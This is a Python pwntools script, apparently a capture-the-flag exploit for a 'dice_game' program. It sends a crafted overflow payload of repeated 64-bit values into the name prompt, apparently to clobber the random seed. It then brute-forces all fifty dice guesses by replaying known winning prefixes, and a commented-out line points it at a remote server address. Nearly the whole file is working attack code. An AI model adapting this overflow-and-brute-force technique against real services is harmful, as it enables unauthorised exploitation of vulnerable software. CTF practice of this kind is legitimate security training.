
from pwn import *
import random
import time
def test(ans):
        p = process('./dice_game')
        # p = remote("47.96.239.28", 9999)
        p.readuntil("name:")
        payload = p64(0xabcdabcdabcdabcd) * 8 + p64(0)
        p.sendline(payload)
        i = 0
        ans_len = len(ans)
        log.success(ans)
        if True:
                while i < ans_len:
                        p.readuntil("nt(1~6): ")
                        n = ans[i]
                        i += 1
                        p.sendline(n)
                random.seed(time.time())
                n = str(int(random.randint(1, 6)))
                p.readuntil("nt(1~6): ")
                p.sendline(n)
                print(n)
                sub = p.readuntil('.')
                log.info(sub)
                return sub, n

ans = ""
while(1):
        if len(ans) == 50:
                print(ans)
                break
        res, n = test(ans)
        if "win" in res:
                ans += n
